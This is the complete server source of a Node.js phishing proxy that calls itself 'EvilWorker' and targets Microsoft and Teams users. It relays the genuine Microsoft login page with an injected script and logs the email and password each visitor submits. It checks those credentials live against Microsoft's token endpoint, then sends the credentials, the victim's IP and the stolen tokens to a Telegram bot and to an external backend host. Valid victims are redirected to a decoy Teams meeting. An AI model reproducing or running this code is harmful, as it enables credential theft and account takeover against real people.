const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');

// ============================================================
//  CONFIGURATION
// ============================================================

const PROXY_ENTRY_POINT = "/login";
const REDIRECT_URL = "https://login.microsoftonline.com/";
const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js"
};

// ============================================================
//  SESSION STORAGE
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: null
    };
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

// ============================================================
//  IP EXTRACTION & GEOLOCATION
// ============================================================

function isPrivateIP(ip) {
    if (!ip) return true;
    if (ip.startsWith('::ffff:')) ip = ip.substring(7);
    const privateRanges = [
        /^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
        /^169\.254\./, /^::1$/, /^fe80:/i, /^fc00:/i, /^fd00:/i
    ];
    return privateRanges.some(re => re.test(ip));
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp && !isPrivateIP(cfIp)) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        for (const ip of ips) {
            if (!isPrivateIP(ip)) return ip;
        }
    }

    const remote = req.socket.remoteAddress;
    if (remote && !isPrivateIP(remote)) return remote;

    return 'unknown';
}

// ============================================================
//  HELPERS
// ============================================================

async function sendToBackend(email, password, req, attemptType, ip) {
    try {
        const axios = require('axios');
        await axios.post(`${BACKEND_URL}/api/log-action`, {
            action: attemptType === 'valid' ? 'login_success' : 'login_failed',
            email: email || 'unknown',
            password: password || '',
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'] || 'Unknown',
                ip: ip || 'unknown'
            }
        });
        console.log(`[BACKEND] ✅ Sent ${attemptType} for: ${email}`);
    } catch (error) {
        console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
    }
}

async function sendAuthResultToTelegram(email, password, success, ip, attemptCount, cookies = null) {
    try {
        const axios = require('axios');
        let msg = `🔐 *Zoom Login Attempt #${attemptCount}*\n\n`;
        msg += `*📧 Email:* ${email || 'unknown'}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📡 IP:* ${ip || 'unknown'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
        if (cookies) {
            msg += `\n*🍪 Session Cookies (HttpOnly):*\n`;
            for (const [name, value] of Object.entries(cookies)) {
                msg += `  \`${name}\`: \`${value}\`\n`;
            }
        }
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log(`[TELEGRAM] ✅ Sent auth result for: ${email}`);
    } catch (error) {
        console.error(`[TELEGRAM] ❌ Failed to send: ${error.message}`);
    }
}

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: '943a2b14-68aa-4205-88c1-a4b65ab04e81',
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email'
        });
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({
                            success: true,
                            data: response,
                            cookies: {
                                'ESTSAUTH': response.access_token,
                                'ESTSAUTHPERSISTENT': response.refresh_token || 'N/A'
                            }
                        });
                    } else {
                        resolve({ success: false, error: response.error_description || 'Invalid credentials', cookies: null });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType, 'Cache-Control': 'no-store' });
        res.end(data);
    });
}

// ============================================================
//  REQUEST HANDLERS
// ============================================================

function handleLoginRequest(req, res) {
    // ============================================================
    //  FIX: Extract email from URL and decode properly
    // ============================================================
    const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    
    // If no email in URL, try to get from session
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    // If still no email, use a default test email
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found in request, using test email');
        email = 'test@example.com';
    }

    const hasError = req.url.includes('error=');

    // Create session and store email
    const sessionId = createSession(email);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    // Build the Microsoft OAuth URL
    let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
    if (hasError) {
        const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
        targetUrl += `&error=${errorParam}`;
    }

    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
    console.log(`[PROXY] 📧 Email: ${email}`);
    console.log(`[PROXY] 🆔 Session ID: ${sessionId}`);

    https.get(targetUrl, (targetRes) => {
        let data = [];
        targetRes.on('data', chunk => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data).toString();
            body = body.replace('</body>', `<script src="${PROXY_PATHNAMES.script}"></script></body>`);
            res.writeHead(200, { 'Content-Type': 'text/html', 'Cache-Control': 'no-store' });
            res.end(body);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);

        // ============================================================
        //  FIX: Extract email from session first, then form, then referer, then URL
        // ============================================================
        let email = '';
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        // 1. Try session
        if (sessionId) {
            const session = getSession(sessionId);
            if (session) {
                email = session.email;
                console.log(`[POST] ✅ Using session email: ${email}`);
            }
        }
        
        // 2. Try form data
        if (!email) {
            email = formData.login || formData.loginfmt || formData.email || '';
            if (email) console.log(`[POST] Using form email: ${email}`);
        }
        
        // 3. Try referer
        if (!email) {
            const referer = req.headers.referer || '';
            const match = referer.match(/login_hint=([^&]+)/);
            if (match) {
                email = decodeURIComponent(match[1]);
                console.log(`[POST] Using referer email: ${email}`);
            }
        }
        
        // 4. Try URL
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) {
                email = decodeURIComponent(match[1]);
                console.log(`[POST] Using URL email: ${email}`);
            }
        }

        // 5. Final fallback: use a test email
        if (!email) {
            console.warn('[POST] ⚠️ No email found anywhere, using test email');
            email = 'test@example.com';
        }

        const password = formData.passwd || formData.password || '';

        // Track attempts
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}, Attempt #${attemptCount}, IP: ${ip}`);

        sendToBackend(email, password, req, 'attempt', ip);

        verifyWithMicrosoft(email, password)
            .then((result) => {
                if (result.success) {
                    console.log(`[AUTH] ✅ Valid credentials for: ${email}`);
                    sendAuthResultToTelegram(email, password, true, ip, attemptCount, result.cookies);
                    sendToBackend(email, password, req, 'valid', ip);
                    res.writeHead(302, { 'Location': TEAMS_REDIRECT, 'Cache-Control': 'no-store' });
                    res.end();
                } else {
                    console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
                    sendAuthResultToTelegram(email, password, false, ip, attemptCount, null);
                    sendToBackend(email, password, req, 'invalid', ip);
                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                }
            })
            .catch((error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=service_error`;
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === '/404' || req.url === '/404_not_found_lk48ZVr32WvU.html') {
        serveFile('404_not_found_lk48ZVr32WvU.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('service_worker_Mz8XO2ny1Pg5.js', res, 'text/javascript');
        return;
    }
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ EvilWorker proxy running on port ${PORT}`);
    console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
    console.log(`🔗 Backend URL: ${BACKEND_URL}`);
    console.log(`📤 Teams redirect: ${TEAMS_REDIRECT}`);
    console.log('🔄 Proxy is ready for connections');
});

process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));